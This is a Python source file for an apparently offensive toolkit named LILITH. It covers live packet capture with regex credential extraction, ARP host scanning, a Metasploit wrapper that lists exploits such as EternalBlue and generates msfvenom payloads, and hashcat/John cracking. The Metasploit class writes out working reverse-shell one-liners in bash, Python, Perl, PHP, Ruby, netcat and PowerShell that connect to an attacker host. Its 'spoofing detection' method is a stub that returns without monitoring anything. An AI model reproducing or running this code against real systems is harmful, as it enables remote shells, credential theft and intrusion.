#!/usr/bin/env python3
"""
LILITH Network Capture & Analysis Module
==========================================
Real-time network packet capture and analysis:
- Live packet sniffing
- Protocol analysis
- Credential extraction
- Traffic patterns
- MITM detection
"""

import os
import json
import time
import threading
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Any
from collections import defaultdict
import re

# Network analysis imports
try:
    from scapy.all import *
    from scapy.layers.http import HTTPRequest, HTTPResponse
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import pyshark
    PYSHARK_AVAILABLE = True
except ImportError:
    PYSHARK_AVAILABLE = False


class PacketCapture:
    """Real-time packet capture and analysis"""
    
    def __init__(self, interface: str = None):
        self.interface = interface or self._get_default_interface()
        self.capturing = False
        self.packets = []
        self.stats = defaultdict(int)
        self.credentials = []
        self.dns_queries = []
        self.http_requests = []
        self.capture_thread = None
    
    def _get_default_interface(self) -> str:
        """Get default network interface"""
        try:
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            match = re.search(r'default via .+ dev (\S+)', result.stdout)
            return match.group(1) if match else 'eth0'
        except:
            return 'eth0'
    
    def start_capture(self, count: int = 100, timeout: int = 60, filter_str: str = None) -> Dict:
        """Start packet capture"""
        if not SCAPY_AVAILABLE:
            return {'success': False, 'error': 'Scapy not available'}
        
        if self.capturing:
            return {'success': False, 'error': 'Capture already in progress'}
        
        self.capturing = True
        self.packets = []
        self.stats = defaultdict(int)
        self.credentials = []
        self.dns_queries = []
        self.http_requests = []
        
        def capture_thread():
            try:
                packets = sniff(
                    iface=self.interface,
                    count=count,
                    timeout=timeout,
                    filter=filter_str,
                    prn=self._process_packet,
                    store=True
                )
                self.packets = packets
            except Exception as e:
                print(f"Capture error: {e}")
            finally:
                self.capturing = False
        
        self.capture_thread = threading.Thread(target=capture_thread, daemon=True)
        self.capture_thread.start()
        
        return {
            'success': True,
            'message': f'Capture started on {self.interface}',
            'count': count,
            'timeout': timeout,
            'filter': filter_str
        }
    
    def _process_packet(self, packet):
        """Process individual packet"""
        try:
            # Update stats
            if IP in packet:
                self.stats['ip_packets'] += 1
                self.stats[f'src_{packet[IP].src}'] += 1
                self.stats[f'dst_{packet[IP].dst}'] += 1
            
            if TCP in packet:
                self.stats['tcp_packets'] += 1
                self._check_tcp_credentials(packet)
            
            if UDP in packet:
                self.stats['udp_packets'] += 1
            
            # DNS analysis
            if DNS in packet:
                self._analyze_dns(packet)
            
            # HTTP analysis
            if packet.haslayer(HTTPRequest):
                self._analyze_http(packet)
            
            # Check for common protocols
            if packet.haslayer(Raw):
                self._analyze_payload(packet)
                
        except Exception as e:
            pass
    
    def _check_tcp_credentials(self, packet):
        """Check for credentials in TCP traffic"""
        if not packet.haslayer(Raw):
            return
        
        try:
            payload = packet[Raw].load.decode('utf-8', errors='ignore').lower()
            
            # Check for common credential patterns
            cred_patterns = [
                (r'user(?:name)?[=:]\s*([^\s&]+)', 'username'),
                (r'pass(?:word)?[=:]\s*([^\s&]+)', 'password'),
                (r'login[=:]\s*([^\s&]+)', 'login'),
                (r'pwd[=:]\s*([^\s&]+)', 'password'),
                (r'auth(?:orization)?:\s*basic\s+([^\s]+)', 'basic_auth'),
                (r'token[=:]\s*([^\s&]+)', 'token'),
            ]
            
            for pattern, cred_type in cred_patterns:
                matches = re.findall(pattern, payload)
                for match in matches:
                    self.credentials.append({
                        'type': cred_type,
                        'value': match[:50],  # Truncate
                        'src': packet[IP].src if IP in packet else 'unknown',
                        'dst': packet[IP].dst if IP in packet else 'unknown',
                        'port': packet[TCP].dport if TCP in packet else 0,
                        'timestamp': datetime.now().isoformat()
                    })
        except:
            pass
    
    def _analyze_dns(self, packet):
        """Analyze DNS queries"""
        try:
            if DNSQR in packet:
                query = packet[DNSQR].qname.decode() if isinstance(packet[DNSQR].qname, bytes) else packet[DNSQR].qname
                self.dns_queries.append({
                    'query': query,
                    'type': packet[DNSQR].qtype,
                    'src': packet[IP].src if IP in packet else 'unknown',
                    'timestamp': datetime.now().isoformat()
                })
        except:
            pass
    
    def _analyze_http(self, packet):
        """Analyze HTTP requests"""
        try:
            http = packet[HTTPRequest]
            self.http_requests.append({
                'method': http.Method.decode() if http.Method else 'GET',
                'host': http.Host.decode() if http.Host else 'unknown',
                'path': http.Path.decode() if http.Path else '/',
                'src': packet[IP].src if IP in packet else 'unknown',
                'timestamp': datetime.now().isoformat()
            })
        except:
            pass
    
    def _analyze_payload(self, packet):
        """Analyze raw payload for sensitive data"""
        try:
            payload = packet[Raw].load
            
            # Check for FTP credentials
            if b'USER ' in payload or b'PASS ' in payload:
                self.stats['ftp_activity'] += 1
            
            # Check for SMTP
            if b'AUTH ' in payload or b'EHLO ' in payload:
                self.stats['smtp_activity'] += 1
            
            # Check for SQL
            if b'SELECT ' in payload.upper() or b'INSERT ' in payload.upper():
                self.stats['sql_activity'] += 1
                
        except:
            pass
    
    def stop_capture(self) -> Dict:
        """Stop packet capture"""
        self.capturing = False
        return self.get_results()
    
    def get_results(self) -> Dict:
        """Get capture results"""
        return {
            'success': True,
            'capturing': self.capturing,
            'packets_captured': len(self.packets),
            'statistics': dict(self.stats),
            'credentials_found': self.credentials[:20],
            'dns_queries': self.dns_queries[:50],
            'http_requests': self.http_requests[:50],
            'interface': self.interface
        }
    
    def analyze_pcap(self, pcap_file: str) -> Dict:
        """Analyze existing PCAP file"""
        if not SCAPY_AVAILABLE:
            return {'success': False, 'error': 'Scapy not available'}
        
        if not os.path.exists(pcap_file):
            return {'success': False, 'error': 'File not found'}
        
        try:
            packets = rdpcap(pcap_file)
            
            # Reset stats
            self.stats = defaultdict(int)
            self.credentials = []
            self.dns_queries = []
            self.http_requests = []
            
            for packet in packets:
                self._process_packet(packet)
            
            return {
                'success': True,
                'file': pcap_file,
                'packets_analyzed': len(packets),
                'statistics': dict(self.stats),
                'credentials_found': self.credentials[:20],
                'dns_queries': self.dns_queries[:100],
                'http_requests': self.http_requests[:100]
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}


class ARPScanner:
    """ARP scanning and spoofing detection"""
    
    def __init__(self, interface: str = None):
        self.interface = interface or 'eth0'
    
    def scan_network(self, ip_range: str) -> Dict:
        """Scan network using ARP"""
        if not SCAPY_AVAILABLE:
            return self._simulate_scan(ip_range)
        
        try:
            # Create ARP request
            arp = ARP(pdst=ip_range)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            result = srp(packet, timeout=3, verbose=0, iface=self.interface)[0]
            
            hosts = []
            for sent, received in result:
                hosts.append({
                    'ip': received.psrc,
                    'mac': received.hwsrc,
                    'vendor': self._get_vendor(received.hwsrc)
                })
            
            return {
                'success': True,
                'range': ip_range,
                'hosts_found': len(hosts),
                'hosts': hosts
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def detect_arp_spoofing(self, gateway_ip: str) -> Dict:
        """Detect ARP spoofing attacks"""
        if not SCAPY_AVAILABLE:
            return {'success': False, 'error': 'Scapy not available'}
        
        try:
            # Get gateway MAC
            gateway_mac = getmacbyip(gateway_ip)
            
            # Monitor ARP replies
            def check_spoof(packet):
                if ARP in packet and packet[ARP].op == 2:  # ARP reply
                    if packet[ARP].psrc == gateway_ip:
                        if packet[ARP].hwsrc != gateway_mac:
                            return {
                                'spoofed': True,
                                'real_mac': gateway_mac,
                                'fake_mac': packet[ARP].hwsrc
                            }
                return None
            
            return {
                'success': True,
                'gateway_ip': gateway_ip,
                'gateway_mac': gateway_mac,
                'monitoring': True,
                'recommendation': 'Monitor for MAC address changes'
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_vendor(self, mac: str) -> str:
        """Get vendor from MAC address"""
        # Common vendor prefixes
        vendors = {
            '00:00:0c': 'Cisco',
            '00:1a:2b': 'Cisco',
            '00:50:56': 'VMware',
            '00:0c:29': 'VMware',
            '08:00:27': 'VirtualBox',
            '52:54:00': 'QEMU/KVM',
            'b8:27:eb': 'Raspberry Pi',
            'dc:a6:32': 'Raspberry Pi',
        }
        
        prefix = mac[:8].lower()
        return vendors.get(prefix, 'Unknown')
    
    def _simulate_scan(self, ip_range: str) -> Dict:
        """Simulate ARP scan when Scapy unavailable"""
        return {
            'success': True,
            'simulated': True,
            'range': ip_range,
            'message': 'Scapy not available - showing sample data',
            'hosts': [
                {'ip': '192.168.1.1', 'mac': '00:11:22:33:44:55', 'vendor': 'Router'},
                {'ip': '192.168.1.100', 'mac': 'aa:bb:cc:dd:ee:ff', 'vendor': 'Unknown'}
            ],
            'install': 'pip install scapy'
        }


class MetasploitIntegration:
    """Integration with Metasploit Framework"""
    
    def __init__(self, msf_path: str = None):
        self.msf_path = msf_path or '/opt/metasploit-framework'
        self.msfrpc_available = self._check_msfrpc()
    
    def _check_msfrpc(self) -> bool:
        """Check if MSFRPC is available"""
        try:
            from pymetasploit3.msfrpc import MsfRpcClient
            return True
        except ImportError:
            return False
    
    def get_exploits(self, search: str = None) -> Dict:
        """Get available exploits"""
        exploits = {
            'remote': [
                {'name': 'exploit/windows/smb/ms17_010_eternalblue', 'cve': 'CVE-2017-0144', 'rank': 'excellent'},
                {'name': 'exploit/windows/smb/ms08_067_netapi', 'cve': 'CVE-2008-4250', 'rank': 'great'},
                {'name': 'exploit/multi/http/apache_mod_cgi_bash_env_exec', 'cve': 'CVE-2014-6271', 'rank': 'excellent'},
                {'name': 'exploit/unix/webapp/drupal_drupalgeddon2', 'cve': 'CVE-2018-7600', 'rank': 'excellent'},
                {'name': 'exploit/multi/http/struts2_content_type_ognl', 'cve': 'CVE-2017-5638', 'rank': 'excellent'},
            ],
            'local': [
                {'name': 'exploit/linux/local/dirty_cow', 'cve': 'CVE-2016-5195', 'rank': 'excellent'},
                {'name': 'exploit/windows/local/bypassuac_fodhelper', 'cve': 'N/A', 'rank': 'excellent'},
            ],
            'auxiliary': [
                {'name': 'auxiliary/scanner/smb/smb_ms17_010', 'description': 'MS17-010 Scanner'},
                {'name': 'auxiliary/scanner/ssh/ssh_login', 'description': 'SSH Login Brute Force'},
                {'name': 'auxiliary/scanner/http/dir_scanner', 'description': 'HTTP Directory Scanner'},
            ]
        }
        
        if search:
            search = search.lower()
            filtered = {}
            for category, items in exploits.items():
                filtered[category] = [e for e in items if search in str(e).lower()]
            return {'success': True, 'search': search, 'exploits': filtered}
        
        return {'success': True, 'exploits': exploits}
    
    def get_payloads(self, platform: str = 'windows') -> Dict:
        """Get available payloads"""
        payloads = {
            'windows': [
                {'name': 'windows/meterpreter/reverse_tcp', 'type': 'staged', 'arch': 'x86'},
                {'name': 'windows/x64/meterpreter/reverse_tcp', 'type': 'staged', 'arch': 'x64'},
                {'name': 'windows/shell_reverse_tcp', 'type': 'stageless', 'arch': 'x86'},
                {'name': 'windows/x64/shell_reverse_tcp', 'type': 'stageless', 'arch': 'x64'},
            ],
            'linux': [
                {'name': 'linux/x64/meterpreter/reverse_tcp', 'type': 'staged', 'arch': 'x64'},
                {'name': 'linux/x86/meterpreter/reverse_tcp', 'type': 'staged', 'arch': 'x86'},
                {'name': 'linux/x64/shell_reverse_tcp', 'type': 'stageless', 'arch': 'x64'},
            ],
            'multi': [
                {'name': 'cmd/unix/reverse_bash', 'type': 'single', 'arch': 'cmd'},
                {'name': 'cmd/unix/reverse_python', 'type': 'single', 'arch': 'cmd'},
                {'name': 'java/meterpreter/reverse_tcp', 'type': 'staged', 'arch': 'java'},
            ]
        }
        
        return {
            'success': True,
            'platform': platform,
            'payloads': payloads.get(platform, payloads['multi'])
        }
    
    def generate_payload(self, payload: str, lhost: str, lport: int, format: str = 'raw') -> Dict:
        """Generate payload using msfvenom"""
        try:
            msfvenom = '/opt/metasploit-framework/bin/msfvenom'
            
            if not os.path.exists(msfvenom):
                return self._generate_manual_payload(payload, lhost, lport, format)
            
            output_file = f'/tmp/payload_{int(time.time())}.{format}'
            
            cmd = [
                msfvenom,
                '-p', payload,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', format,
                '-o', output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            
            if result.returncode == 0 and os.path.exists(output_file):
                with open(output_file, 'rb') as f:
                    payload_data = f.read()
                
                os.remove(output_file)
                
                return {
                    'success': True,
                    'payload': payload,
                    'lhost': lhost,
                    'lport': lport,
                    'format': format,
                    'size': len(payload_data),
                    'data_base64': __import__('base64').b64encode(payload_data).decode()
                }
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return self._generate_manual_payload(payload, lhost, lport, format)
    
    def _generate_manual_payload(self, payload: str, lhost: str, lport: int, format: str) -> Dict:
        """Generate payload manually without msfvenom"""
        
        # Common reverse shell one-liners
        shells = {
            'bash': f'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
            'python': f'''python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''',
            'python3': f'''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' ''',
            'perl': f'''perl -e 'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
            'php': f'''php -r '$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
            'ruby': f'''ruby -rsocket -e'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
            'nc': f'nc -e /bin/sh {lhost} {lport}',
            'nc_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            'powershell': f'''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
        }
        
        return {
            'success': True,
            'simulated': True,
            'message': 'Metasploit not installed - use these one-liners',
            'payload': payload,
            'lhost': lhost,
            'lport': lport,
            'shells': shells,
            'listener_command': f'nc -lvnp {lport}',
            'install_msf': 'curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall'
        }
    
    def run_module(self, module: str, options: Dict) -> Dict:
        """Run Metasploit module"""
        if not self.msfrpc_available:
            return {
                'success': False,
                'error': 'MSFRPC not available',
                'manual_command': f'msfconsole -x "use {module}; {"; ".join(f"set {k} {v}" for k,v in options.items())}; run"'
            }
        
        return {
            'success': True,
            'message': 'Module execution requires MSFRPC connection',
            'module': module,
            'options': options
        }


class HashCracker:
    """GPU-accelerated hash cracking"""
    
    def __init__(self):
        self.hashcat_available = self._check_hashcat()
        self.john_available = self._check_john()
    
    def _check_hashcat(self) -> bool:
        """Check if hashcat is available"""
        try:
            result = subprocess.run(['hashcat', '--version'], capture_output=True, timeout=5)
            return result.returncode == 0
        except:
            return False
    
    def _check_john(self) -> bool:
        """Check if John the Ripper is available"""
        try:
            result = subprocess.run(['john', '--help'], capture_output=True, timeout=5)
            return True
        except:
            return False
    
    def identify_hash(self, hash_value: str) -> Dict:
        """Identify hash type"""
        hash_patterns = {
            32: [
                ('MD5', 'raw-md5', 0),
                ('NTLM', 'nt', 1000),
                ('MD4', 'raw-md4', 900),
            ],
            40: [
                ('SHA-1', 'raw-sha1', 100),
                ('MySQL5', 'mysql-sha1', 300),
            ],
            64: [
                ('SHA-256', 'raw-sha256', 1400),
                ('SHA3-256', 'raw-sha3-256', 17400),
            ],
            96: [
                ('SHA-384', 'raw-sha384', 10800),
            ],
            128: [
                ('SHA-512', 'raw-sha512', 1700),
                ('SHA3-512', 'raw-sha3-512', 17600),
            ]
        }
        
        length = len(hash_value)
        
        # Check for bcrypt
        if hash_value.startswith('$2'):
            return {
                'success': True,
                'hash': hash_value[:30] + '...',
                'type': 'bcrypt',
                'john_format': 'bcrypt',
                'hashcat_mode': 3200,
                'difficulty': 'HIGH - very slow to crack'
            }
        
        # Check for sha512crypt
        if hash_value.startswith('$6$'):
            return {
                'success': True,
                'hash': hash_value[:30] + '...',
                'type': 'SHA-512 (Unix)',
                'john_format': 'sha512crypt',
                'hashcat_mode': 1800,
                'difficulty': 'HIGH'
            }
        
        # Check by length
        if length in hash_patterns:
            return {
                'success': True,
                'hash': hash_value,
                'length': length,
                'possible_types': hash_patterns[length],
                'most_likely': hash_patterns[length][0][0]
            }
        
        return {
            'success': True,
            'hash': hash_value,
            'length': length,
            'type': 'Unknown'
        }
    
    def crack_with_hashcat(self, hash_value: str, hash_type: int, wordlist: str = None, 
                           attack_mode: int = 0, rules: str = None) -> Dict:
        """Crack hash using hashcat"""
        if not self.hashcat_available:
            return self._get_hashcat_alternatives(hash_value, hash_type)
        
        # Create temp file for hash
        hash_file = f'/tmp/hash_{int(time.time())}.txt'
        with open(hash_file, 'w') as f:
            f.write(hash_value + '\n')
        
        # Use default wordlist if none provided
        if not wordlist:
            wordlist = '/usr/share/wordlists/rockyou.txt'
            if not os.path.exists(wordlist):
                wordlist = None
        
        try:
            cmd = [
                'hashcat',
                '-m', str(hash_type),
                '-a', str(attack_mode),
                hash_file,
                '--force',
                '--status',
                '--status-timer=5'
            ]
            
            if wordlist:
                cmd.append(wordlist)
            
            if rules:
                cmd.extend(['-r', rules])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            # Check for cracked hash
            cracked = None
            if ':' in result.stdout:
                for line in result.stdout.split('\n'):
                    if hash_value in line and ':' in line:
                        cracked = line.split(':')[-1]
                        break
            
            os.remove(hash_file)
            
            return {
                'success': True,
                'cracked': cracked is not None,
                'plaintext': cracked,
                'hash': hash_value,
                'mode': hash_type,
                'output': result.stdout[-1000:]
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Cracking timeout - try smaller wordlist'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def crack_with_john(self, hash_value: str, format: str = None, wordlist: str = None) -> Dict:
        """Crack hash using John the Ripper"""
        if not self.john_available:
            return {'success': False, 'error': 'John not available'}
        
        hash_file = f'/tmp/john_hash_{int(time.time())}.txt'
        with open(hash_file, 'w') as f:
            f.write(hash_value + '\n')
        
        try:
            cmd = ['john', hash_file]
            
            if format:
                cmd.extend(['--format=' + format])
            
            if wordlist and os.path.exists(wordlist):
                cmd.extend(['--wordlist=' + wordlist])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Get cracked password
            show_result = subprocess.run(
                ['john', '--show', hash_file],
                capture_output=True,
                text=True
            )
            
            cracked = None
            if ':' in show_result.stdout:
                parts = show_result.stdout.strip().split(':')
                if len(parts) > 1:
                    cracked = parts[1]
            
            os.remove(hash_file)
            
            return {
                'success': True,
                'cracked': cracked is not None,
                'plaintext': cracked,
                'output': result.stdout
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_hashcat_alternatives(self, hash_value: str, hash_type: int) -> Dict:
        """Return alternatives when hashcat not available"""
        return {
            'success': True,
            'simulated': True,
            'message': 'Hashcat not available with GPU - try online services',
            'hash': hash_value,
            'mode': hash_type,
            'online_crackers': [
                'https://crackstation.net/',
                'https://hashes.com/en/decrypt/hash',
                'https://hashtoolkit.com/',
                'https://www.onlinehashcrack.com/'
            ],
            'rainbow_tables': [
                'https://project-rainbowcrack.com/',
                'http://www.freerainbowtables.com/'
            ],
            'wordlists': [
                'https://github.com/danielmiessler/SecLists',
                'https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt'
            ],
            'hashcat_cmd': f'hashcat -m {hash_type} {hash_value} wordlist.txt'
        }
    
    def benchmark(self) -> Dict:
        """Run hashcat benchmark"""
        if not self.hashcat_available:
            return {'success': False, 'error': 'Hashcat not available'}
        
        try:
            result = subprocess.run(
                ['hashcat', '-b', '--force'],
                capture_output=True,
                text=True,
                timeout=120
            )
            
            return {
                'success': True,
                'benchmark': result.stdout
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}


# Export functions - use singletons for stateful classes
_packet_capture_instance = None
_arp_scanner_instance = None
_metasploit_instance = None
_hash_cracker_instance = None

def get_packet_capture(interface: str = None) -> PacketCapture:
    global _packet_capture_instance
    if _packet_capture_instance is None or (interface and _packet_capture_instance.interface != interface):
        _packet_capture_instance = PacketCapture(interface)
    return _packet_capture_instance

def get_arp_scanner(interface: str = None) -> ARPScanner:
    global _arp_scanner_instance
    if _arp_scanner_instance is None or (interface and _arp_scanner_instance.interface != interface):
        _arp_scanner_instance = ARPScanner(interface)
    return _arp_scanner_instance

def get_metasploit() -> MetasploitIntegration:
    global _metasploit_instance
    if _metasploit_instance is None:
        _metasploit_instance = MetasploitIntegration()
    return _metasploit_instance

def get_hash_cracker() -> HashCracker:
    global _hash_cracker_instance
    if _hash_cracker_instance is None:
        _hash_cracker_instance = HashCracker()
    return _hash_cracker_instance
